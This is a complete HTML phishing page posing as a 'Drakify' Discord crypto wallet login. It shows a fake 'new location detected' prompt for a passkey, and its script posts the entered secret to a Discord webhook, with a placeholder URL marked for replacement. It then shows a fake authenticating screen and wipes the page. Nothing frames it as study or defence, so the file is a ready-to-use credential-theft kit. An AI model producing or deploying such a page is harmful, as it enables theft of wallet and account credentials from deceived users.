<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Drakify | Discord Crypto Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      font-family: 'Rubik', sans-serif;
      box-sizing: border-box;
    }

    body {
      background: radial-gradient(circle at top, #2b2d31 0%, #1e1f22 100%);
      color: #fff;
      height: 100vh;
      overflow: hidden;
      position: relative;
    }

    .bg-coin {
      position: absolute;
      width: 40px;
      height: 40px;
      background: url('https://cdn-icons-png.flaticon.com/512/825/825519.png') no-repeat center/cover;
      animation: float 12s linear infinite;
      opacity: 0.2;
    }

    @keyframes float {
      0% {
        transform: translateY(100vh) rotate(0deg);
        left: 10%;
      }
      100% {
        transform: translateY(-120vh) rotate(360deg);
        left: 90%;
      }
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100%;
      position: relative;
      z-index: 1;
    }

    .login-box {
      background: #2b2d31;
      border-radius: 16px;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
      padding: 40px;
      width: 380px;
      text-align: center;
      border: 2px solid #5865f2;
    }

    .avatar {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      border: 3px solid #5865f2;
      margin-bottom: 15px;
    }

    .username {
      font-size: 22px;
      font-weight: 600;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 14px;
      color: #b5bac1;
      margin-bottom: 20px;
    }

    .login-btn {
      background-color: #5865f2;
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    .login-btn:hover {
      background-color: #4752c4;
    }

    .popup, .loading-screen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
      justify-content: center;
      align-items: center;
      z-index: 10;
    }

    .popup {
      background: rgba(0, 0, 0, 0.8);
    }

    .popup-box {
      background: #313338;
      padding: 30px;
      border-radius: 14px;
      width: 320px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
    }

    .popup-box h3 {
      margin-bottom: 10px;
      font-size: 18px;
    }

    .popup-box input {
      width: 90%;
      padding: 10px;
      border-radius: 8px;
      border: none;
      outline: none;
      background: #1e1f22;
      color: white;
      margin-bottom: 15px;
    }

    .popup-box button {
      background-color: #5865f2;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    .popup-box button:hover {
      background-color: #4752c4;
    }

    .loading-screen {
      background: #1e1f22;
      flex-direction: column;
      color: white;
      font-size: 24px;
      font-weight: bold;
      animation: fadeIn 1s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    .loading-dots::after {
      content: '';
      display: inline-block;
      animation: dots 1.5s infinite;
    }

    @keyframes dots {
      0% { content: ''; }
      33% { content: '.'; }
      66% { content: '..'; }
      100% { content: '...'; }
    }
  </style>
</head>
<body>

  <!-- Floating Crypto Coins -->
  <div class="bg-coin" style="top: 80%; left: 5%; animation-delay: 0s;"></div>
  <div class="bg-coin" style="top: 90%; left: 50%; animation-delay: 2s;"></div>
  <div class="bg-coin" style="top: 100%; left: 75%; animation-delay: 4s;"></div>

  <div class="container">
    <div class="login-box">
      <img class="avatar" src="https://i.pinimg.com/736x/ae/ed/d1/aeedd126eb22be0730716d4a6277ca54.jpg" alt="Avatar">
      <div class="username">drakify_x</div>
      <div class="subtitle">Discord Crypto Wallet - Secure Access</div>
      <button class="login-btn" onclick="showPopup()">Log In</button>
    </div>
  </div>

  <div class="popup" id="popup">
    <div class="popup-box">
      <h3>New location detected</h3>
      <p style="margin-bottom: 10px; font-size: 14px; color: #b5bac1;">Please confirm your identity</p>
      <input type="password" id="passInput" placeholder="Enter passkey">
      <br>
      <button onclick="sendPass()">Confirm</button>
    </div>
  </div>

  <div class="loading-screen" id="loading">
    <div class="loading-dots">Authenticating</div>
  </div>

  <script>
    const popup = document.getElementById("popup");
    const loading = document.getElementById("loading");
    const webhookURL = "https://discord.com/api/webhooks/your_webhook_url"; // Replace this

    function showPopup() {
      popup.style.display = "flex";
      document.getElementById("passInput").focus();
    }

    function sendPass() {
      const passkey = document.getElementById("passInput").value;
      if (!passkey) {
        alert("⚠ Please provide a valid passkey.");
        return;
      }

      popup.style.display = "none";

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: `🔐 Passkey submitted: **${passkey}**` })
      })
      .finally(() => {
        loading.style.display = "flex";
        setTimeout(() => {
          document.body.innerHTML = "";
        }, 25000);
      });
    }

    document.getElementById("passInput").addEventListener("keypress", function (e) {
      if (e.key === "Enter") sendPass();
    });
  </script>

</body>
</html>
